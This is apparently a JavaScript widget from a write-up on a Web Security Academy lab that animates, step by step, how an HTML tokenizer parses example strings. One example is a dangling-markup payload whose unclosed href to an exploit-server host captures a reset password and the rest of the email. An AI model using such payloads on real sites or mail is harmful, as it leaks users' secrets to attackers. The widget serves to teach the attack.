(function () {
  if (window.__tokenizerVizLoaded) return;
  window.__tokenizerVizLoaded = true;

  const STATE = {
    DATA: "Data State",
    TAG_OPEN: "Tag Open State",
    END_TAG_OPEN: "End Tag Open State",
    TAG_NAME: "Tag Name State",
    BEFORE_ATTR_NAME: "Before Attribute Name State",
    ATTR_NAME: "Attribute Name State",
    AFTER_ATTR_NAME: "After Attribute Name State",
    BEFORE_ATTR_VALUE: "Before Attribute Value State",
    ATTR_VALUE_SQ: "Attr Value (Single-Quoted) State",
    ATTR_VALUE_DQ: "Attr Value (Double-Quoted) State",
    ATTR_VALUE_UQ: "Attr Value (Unquoted) State",
    AFTER_ATTR_VALUE_Q: "After Attr Value (Quoted) State",
    SELF_CLOSING: "Self-Closing Start Tag State",
  };

  class Tokenizer {
    constructor(input) {
      this.input = input; this.pos = -1; this.state = STATE.DATA;
      this.roles = new Array(input.length).fill(null);
      this.tokens = []; this.currentTag = null;
      this.currentAttrName = ""; this.currentAttrValue = "";
      this.currentData = ""; this.reason = ""; this.error = ""; this.done = false;
      this.struckPositions = new Set();
    }
    snapshot() {
      return { pos: this.pos, state: this.state, roles: [...this.roles],
        tokens: JSON.parse(JSON.stringify(this.tokens)),
        currentTag: this.currentTag ? JSON.parse(JSON.stringify(this.currentTag)) : null,
        currentAttrName: this.currentAttrName, currentAttrValue: this.currentAttrValue,
        currentData: this.currentData, reason: this.reason, error: this.error, done: this.done,
        struckPositions: new Set(this.struckPositions) };
    }
    restore(s) {
      this.pos = s.pos; this.state = s.state; this.roles = [...s.roles];
      this.tokens = JSON.parse(JSON.stringify(s.tokens));
      this.currentTag = s.currentTag ? JSON.parse(JSON.stringify(s.currentTag)) : null;
      this.currentAttrName = s.currentAttrName; this.currentAttrValue = s.currentAttrValue;
      this.currentData = s.currentData; this.reason = s.reason; this.error = s.error; this.done = s.done;
      this.struckPositions = new Set(s.struckPositions);
    }
    step() {
      if (this.done) return; this.pos++; this.error = "";
      if (this.pos >= this.input.length) {
        if (this.currentData) { this.tokens.push({ type: "Character", data: this.currentData }); this.currentData = ""; }
        if (this.currentTag) { this._finalizeAttr(); this._emitTag(); this.error = "EOF in tag -- tag emitted with accumulated attrs"; }
        this.done = true; this.reason = "End of input"; return;
      }
      const c = this.input[this.pos];
      switch (this.state) {
        case STATE.DATA: this._dataState(c); break;
        case STATE.TAG_OPEN: this._tagOpenState(c); break;
        case STATE.END_TAG_OPEN: this._endTagOpenState(c); break;
        case STATE.TAG_NAME: this._tagNameState(c); break;
        case STATE.BEFORE_ATTR_NAME: this._beforeAttrNameState(c); break;
        case STATE.ATTR_NAME: this._attrNameState(c); break;
        case STATE.AFTER_ATTR_NAME: this._afterAttrNameState(c); break;
        case STATE.BEFORE_ATTR_VALUE: this._beforeAttrValueState(c); break;
        case STATE.ATTR_VALUE_SQ: this._attrValueSQState(c); break;
        case STATE.ATTR_VALUE_DQ: this._attrValueDQState(c); break;
        case STATE.ATTR_VALUE_UQ: this._attrValueUQState(c); break;
        case STATE.AFTER_ATTR_VALUE_Q: this._afterAttrValueQState(c); break;
        case STATE.SELF_CLOSING: this._selfClosingState(c); break;
      }
    }
    _emitData() { if (this.currentData) { this.tokens.push({ type: "Character", data: this.currentData }); this.currentData = ""; } }
    _finalizeAttr() {
      if (this.currentAttrName) {
        if (!this.currentTag.attrs) this.currentTag.attrs = [];
        this.currentTag.attrs.push({ name: this.currentAttrName, value: this.currentAttrValue });
        this.currentAttrName = ""; this.currentAttrValue = "";
      }
    }
    _emitTag() { this._finalizeAttr(); this.tokens.push({ ...this.currentTag }); this.currentTag = null; }

    _dataState(c) {
      if (c === '<') { this._emitData(); this.roles[this.pos] = 'delim'; this.state = STATE.TAG_OPEN; this.reason = `Read '<' -> Tag Open`; }
      else { this.roles[this.pos] = 'data'; this.currentData += c; this.reason = `Read '${c}' -> accumulate text`; }
    }
    _tagOpenState(c) {
      if (c === '/') { this.roles[this.pos] = 'delim'; this.state = STATE.END_TAG_OPEN; this.reason = `Read '/' -> End Tag Open`; }
      else if (/[a-zA-Z]/.test(c)) { this.currentTag = { type: "StartTag", name: c, attrs: [], selfClosing: false }; this.roles[this.pos] = 'tag'; this.state = STATE.TAG_NAME; this.reason = `Read '${c}' -> create tag, Tag Name`; }
      else { this.error = "Unexpected char in Tag Open"; this.roles[this.pos] = 'error'; this.state = STATE.DATA; this.reason = `Parse error: unexpected '${c}'`; }
    }
    _endTagOpenState(c) {
      if (/[a-zA-Z]/.test(c)) { this.currentTag = { type: "EndTag", name: c, attrs: [] }; this.roles[this.pos] = 'tag'; this.state = STATE.TAG_NAME; this.reason = `Read '${c}' -> end tag name`; }
      else if (c === '>') { this.error = "Missing end tag name"; this.roles[this.pos] = 'error'; this.state = STATE.DATA; this.reason = `Parse error: empty end tag`; }
      else { this.error = "Unexpected char"; this.roles[this.pos] = 'error'; this.reason = `Parse error: unexpected '${c}'`; }
    }
    _tagNameState(c) {
      if (c === ' ' || c === '\t' || c === '\n') { this.roles[this.pos] = 'delim'; this.state = STATE.BEFORE_ATTR_NAME; this.reason = `Whitespace -> Before Attr Name`; }
      else if (c === '/') { this.roles[this.pos] = 'delim'; this.state = STATE.SELF_CLOSING; this.reason = `Read '/' -> Self-Closing`; }
      else if (c === '>') { this.roles[this.pos] = 'delim'; this._emitTag(); this.state = STATE.DATA; this.reason = `Read '>' -> emit tag, Data`; }
      else { this.currentTag.name += c.toLowerCase(); this.roles[this.pos] = 'tag'; this.reason = `Read '${c}' -> tag: "${this.currentTag.name}"`; }
    }
    _beforeAttrNameState(c) {
      if (c === ' ' || c === '\t' || c === '\n') { this.roles[this.pos] = 'delim'; this.reason = `Skip whitespace`; }
      else if (c === '/') { this.roles[this.pos] = 'delim'; this.state = STATE.SELF_CLOSING; this.reason = `Read '/' -> Self-Closing`; }
      else if (c === '>') { this.roles[this.pos] = 'delim'; this._emitTag(); this.state = STATE.DATA; this.reason = `Read '>' -> emit tag, Data`; }
      else { this.currentAttrName = c.toLowerCase(); this.currentAttrValue = ""; this.roles[this.pos] = 'attrname'; this.state = STATE.ATTR_NAME; this.reason = `Read '${c}' -> start attr name`; }
    }
    _attrNameState(c) {
      if (c === '=') { this.roles[this.pos] = 'equals'; this.state = STATE.BEFORE_ATTR_VALUE; this.reason = `Read '=' -> Before Attr Value`; }
      else if (c === ' ' || c === '\t' || c === '\n') { this.roles[this.pos] = 'delim'; this.state = STATE.AFTER_ATTR_NAME; this.reason = `Whitespace -> After Attr Name`; }
      else if (c === '/') { this._finalizeAttr(); this.roles[this.pos] = 'delim'; this.state = STATE.SELF_CLOSING; this.reason = `Read '/' -> finalize attr, Self-Closing`; }
      else if (c === '>') { this._finalizeAttr(); this.roles[this.pos] = 'delim'; this._emitTag(); this.state = STATE.DATA; this.reason = `Read '>' -> emit tag, Data`; }
      else { this.currentAttrName += c.toLowerCase(); this.roles[this.pos] = 'attrname'; this.reason = `Read '${c}' -> attr: "${this.currentAttrName}"`; }
    }
    _afterAttrNameState(c) {
      if (c === ' ') { this.roles[this.pos] = 'delim'; this.reason = `Skip whitespace`; }
      else if (c === '=') { this.roles[this.pos] = 'equals'; this.state = STATE.BEFORE_ATTR_VALUE; this.reason = `Read '=' -> Before Attr Value`; }
      else if (c === '>') { this._finalizeAttr(); this.roles[this.pos] = 'delim'; this._emitTag(); this.state = STATE.DATA; this.reason = `Read '>' -> emit tag`; }
      else if (c === '/') { this._finalizeAttr(); this.roles[this.pos] = 'delim'; this.state = STATE.SELF_CLOSING; this.reason = `Read '/' -> Self-Closing`; }
      else { this._finalizeAttr(); this.currentAttrName = c.toLowerCase(); this.currentAttrValue = ""; this.roles[this.pos] = 'attrname'; this.state = STATE.ATTR_NAME; this.reason = `New attr starting with '${c}'`; }
    }
    _beforeAttrValueState(c) {
      if (c === ' ') { this.roles[this.pos] = 'delim'; this.reason = `Skip whitespace`; }
      else if (c === "'") { this.roles[this.pos] = 'delim'; this.state = STATE.ATTR_VALUE_SQ; this.reason = `Read "'" -> single-quoted value`; }
      else if (c === '"') { this.roles[this.pos] = 'delim'; this.state = STATE.ATTR_VALUE_DQ; this.reason = `Read '"' -> double-quoted value`; }
      else if (c === '>') { this.error = "Missing attribute value"; this._finalizeAttr(); this.roles[this.pos] = 'delim'; this._emitTag(); this.state = STATE.DATA; this.reason = `Parse error: missing value`; }
      else { this.currentAttrValue = c; this.roles[this.pos] = 'attrval'; this.state = STATE.ATTR_VALUE_UQ; this.reason = `Read '${c}' -> unquoted value`; }
    }
    _attrValueSQState(c) {
      if (c === "'") { this.roles[this.pos] = 'delim'; this._finalizeAttr(); this.state = STATE.AFTER_ATTR_VALUE_Q; this.reason = `Read "'" -> CLOSE single-quoted value`; }
      else { this.currentAttrValue += c; this.roles[this.pos] = 'attrval'; this.reason = `Read '${c}' -> append to value`; }
    }
    _attrValueDQState(c) {
      if (c === '"') { this.roles[this.pos] = 'delim'; this._finalizeAttr(); this.state = STATE.AFTER_ATTR_VALUE_Q; this.reason = `Read '"' -> close double-quoted value`; }
      else { this.currentAttrValue += c; this.roles[this.pos] = 'attrval'; this.reason = `Read '${c}' -> append to value`; }
    }
    _attrValueUQState(c) {
      if (c === ' ' || c === '\t') { this._finalizeAttr(); this.roles[this.pos] = 'delim'; this.state = STATE.BEFORE_ATTR_NAME; this.reason = `Whitespace -> end unquoted value`; }
      else if (c === '>') { this._finalizeAttr(); this.roles[this.pos] = 'delim'; this._emitTag(); this.state = STATE.DATA; this.reason = `Read '>' -> emit tag`; }
      else {
        if ("'\"=<`".includes(c)) this.error = `Unexpected '${c}' in unquoted attr value`;
        this.currentAttrValue += c;
        this.roles[this.pos] = "'\"=<`".includes(c) ? 'error' : 'attrval';
        this.reason = `Read '${c}' -> append to unquoted value`;
      }
    }
    _afterAttrValueQState(c) {
      if (c === ' ' || c === '\t' || c === '\n') { this.roles[this.pos] = 'delim'; this.state = STATE.BEFORE_ATTR_NAME; this.reason = `Whitespace -> Before Attr Name`; }
      else if (c === '/') { this.roles[this.pos] = 'delim'; this.state = STATE.SELF_CLOSING; this.reason = `Read '/' -> Self-Closing`; }
      else if (c === '>') { this.roles[this.pos] = 'delim'; this._emitTag(); this.state = STATE.DATA; this.reason = `Read '>' -> emit tag, Data`; }
      else {
        this.error = "Missing whitespace between attributes";
        this.currentAttrName = c.toLowerCase(); this.currentAttrValue = "";
        this.roles[this.pos] = 'error'; this.state = STATE.ATTR_NAME;
        this.reason = `!! No space after quoted value -> parse error, new attr '${c}'`;
      }
    }
    _selfClosingState(c) {
      if (c === '>') {
        if (this.currentTag) this.currentTag.selfClosing = true;
        this.roles[this.pos] = 'delim'; this._emitTag(); this.state = STATE.DATA;
        this.reason = `Read '>' -> emit self-closing tag`;
      } else {
        this.error = `Unexpected '${c}' in Self-Closing (expected '>'), abort self-closing`;
        // The `/` that led us here was consumed for nothing; mark it struck so the UI
        // shows why it vanishes from the tokenised stream.
        this.struckPositions.add(this.pos - 1);
        this.state = STATE.BEFORE_ATTR_NAME;
        this.reason = `Parse error: '${c}' instead of '>' -> abort self-closing, reconsume in Before Attr Name`;
        this._beforeAttrNameState(c);
      }
    }
  }

  // Keyed registry -- one slug per example. Extendable without touching callers.
  const EXAMPLES = {
    "normal": {
      label: "Normal", tag: "normal", tagClass: "normal",
      desc: "Baseline -- proper single-quoted href, clean parse",
      src: `<p>Hello!</p><p><a href='https://xxx.web-security-academy.net/login'>click here</a></p>`
    },
    "quote-break": {
      label: "Quote break", tag: "injection", tagClass: "injection",
      desc: "Single quote in port breaks href; /login is reinterpreted as a bogus attribute after a self-closing abort",
      src: `<a href='https://xxx.web-security-academy.net:foo'/login'>click here</a>`
    },
    "open-quote": {
      label: "Open \"", tag: "exploit", tagClass: "exploit",
      desc: "Second href has no closing \" -- dangling markup swallows the password and trailing mail content into the URL",
      src: `<a href='https://xxx.web-security-academy.net:'><a href="https://exploit-xxx.exploit-server.net?/login'>click here</a> to login with your new password: CKOnV2tEfS</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>`
    },
  };

  const ROLE_MAP = {
    tag: 'role-tag', attrname: 'role-attrname', attrval: 'role-attrval',
    data: 'role-data', delim: 'role-delim', equals: 'role-equals', error: 'role-error'
  };

  function mountRunner(container) {
    const slug = container.dataset.example;
    const ex = EXAMPLES[slug];
    if (!ex) { container.textContent = `Unknown tokenizer example: ${slug}`; return; }

    container.innerHTML = `
      <div class="col-controls">
        <button class="btn" data-action="reset">Reset</button>
        <button class="btn" data-action="back">Back</button>
        <button class="btn" data-action="step">Step</button>
        <button class="btn" data-action="play">Play</button>
        <div class="speed-control">
          <span>Spd</span>
          <input type="range" data-role="speed" min="1" max="10" value="5">
        </div>
      </div>
      <div class="step-slider-row">
        <span class="step-label" data-role="sliderLabel">Step 0/0</span>
        <input type="range" data-role="stepSlider" min="0" max="0" value="0">
      </div>
      <div class="source-area"><div class="char-grid" data-role="grid"></div></div>
      <div class="state-display">
        <h3>Tokenizer State</h3>
        <div class="state-name" data-role="state">Data State</div>
        <div class="transition-reason" data-role="reason"></div>
        <div class="parse-error" data-role="error"></div>
      </div>
      <div class="tokens-area">
        <h3>Emitted Tokens</h3>
        <div data-role="tokens"></div>
      </div>
    `;

    const $ = (role) => container.querySelector(`[data-role="${role}"]`);
    const $btn = (action) => container.querySelector(`[data-action="${action}"]`);

    const runner = { tokenizer: null, history: [], allSnapshots: [], playing: false, timer: null };

    function init() {
      stopPlay();
      runner.tokenizer = new Tokenizer(ex.src);
      runner.history = [runner.tokenizer.snapshot()];
      const t2 = new Tokenizer(ex.src);
      runner.allSnapshots = [t2.snapshot()];
      while (!t2.done) { t2.step(); runner.allSnapshots.push(t2.snapshot()); }
      renderGrid();
      updateUI();
    }

    function renderGrid() {
      const grid = $('grid');
      grid.innerHTML = '';
      for (let j = 0; j < ex.src.length; j++) {
        const span = document.createElement('span');
        span.className = 'char-cell pending';
        span.textContent = ex.src[j] === ' ' ? ' ' : ex.src[j];
        grid.appendChild(span);
      }
    }

    function updateUI() {
      const t = runner.tokenizer;
      const cells = $('grid').children;
      for (let j = 0; j < t.input.length; j++) {
        const el = cells[j];
        el.className = 'char-cell';
        if (j < t.pos) {
          el.classList.add(ROLE_MAP[t.roles[j]] || '');
          if (t.struckPositions.has(j)) el.classList.add('struck');
        } else if (j === t.pos) el.classList.add('current');
        else el.classList.add('pending');
      }

      $('state').textContent = t.state;
      $('reason').textContent = t.reason;

      const errEl = $('error');
      if (t.error) { errEl.textContent = '!! ' + t.error; errEl.classList.add('visible'); }
      else errEl.classList.remove('visible');

      const stepNum = runner.history.length - 1;
      const maxSteps = runner.allSnapshots.length - 1;
      $btn('back').disabled = (stepNum <= 0);
      $btn('step').disabled = t.done;

      const slider = $('stepSlider');
      slider.max = maxSteps;
      slider.value = stepNum;
      $('sliderLabel').textContent = `Step ${stepNum}/${maxSteps}`;

      const tokensEl = $('tokens');
      tokensEl.innerHTML = '';
      t.tokens.forEach(tok => {
        const div = document.createElement('div');
        if (tok.type === 'StartTag') {
          div.className = 'token-entry start-tag';
          let html = `<span class="token-type t-start">StartTag</span> &lt;${tok.name}&gt;`;
          if (tok.attrs && tok.attrs.length) {
            tok.attrs.forEach(a => {
              const sv = a.value.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
              const sn = a.name.replace(/</g,'&lt;').replace(/>/g,'&gt;');
              html += `<br>&nbsp;&nbsp;<span class="attr-display">${sn}</span>=<span class="attr-val-display">"${sv}"</span>`;
            });
          }
          div.innerHTML = html;
        } else if (tok.type === 'EndTag') {
          div.className = 'token-entry end-tag';
          div.innerHTML = `<span class="token-type t-end">EndTag</span> &lt;/${tok.name}&gt;`;
        } else if (tok.type === 'Character') {
          div.className = 'token-entry character';
          const safe = tok.data.replace(/</g,'&lt;').replace(/>/g,'&gt;');
          div.innerHTML = `<span class="token-type t-char">Character</span> "${safe}"`;
        }
        tokensEl.appendChild(div);
      });
    }

    function stepFwd() {
      if (runner.tokenizer.done) return;
      const nextStep = runner.history.length;
      if (nextStep < runner.allSnapshots.length) {
        runner.history.push(runner.allSnapshots[nextStep]);
        runner.tokenizer.restore(runner.allSnapshots[nextStep]);
      }
      updateUI();
    }
    function stepBack() {
      if (runner.history.length <= 1) return;
      runner.history.pop();
      runner.tokenizer.restore(runner.history[runner.history.length - 1]);
      updateUI();
    }
    function seekTo(target) {
      if (target < 0) target = 0;
      if (target >= runner.allSnapshots.length) target = runner.allSnapshots.length - 1;
      runner.tokenizer.restore(runner.allSnapshots[target]);
      runner.history = runner.allSnapshots.slice(0, target + 1);
      updateUI();
    }
    function togglePlay() {
      if (runner.playing) stopPlay();
      else {
        runner.playing = true;
        const btn = $btn('play');
        btn.textContent = 'Pause'; btn.classList.add('active');
        scheduleStep();
      }
    }
    function scheduleStep() {
      const speed = parseInt($('speed').value, 10);
      runner.timer = setTimeout(() => {
        if (!runner.playing) return;
        if (runner.tokenizer.done) { stopPlay(); return; }
        stepFwd();
        if (runner.playing) scheduleStep();
      }, 1000 / speed);
    }
    function stopPlay() {
      runner.playing = false;
      clearTimeout(runner.timer);
      const btn = $btn('play');
      if (btn) { btn.textContent = 'Play'; btn.classList.remove('active'); }
    }

    $btn('reset').addEventListener('click', init);
    $btn('back').addEventListener('click', stepBack);
    $btn('step').addEventListener('click', stepFwd);
    $btn('play').addEventListener('click', togglePlay);
    $('stepSlider').addEventListener('input', (e) => seekTo(parseInt(e.target.value, 10)));

    // Keyboard nav is per-container: arrows only move the currently focused viz.
    container.tabIndex = 0;
    container.addEventListener('keydown', (e) => {
      if (e.key === 'ArrowRight') { stepFwd(); e.preventDefault(); }
      else if (e.key === 'ArrowLeft') { stepBack(); e.preventDefault(); }
    });

    init();
  }

  document.addEventListener('DOMContentLoaded', () => {
    document.querySelectorAll('.tokenizer-viz[data-example]').forEach(mountRunner);
  });
})();
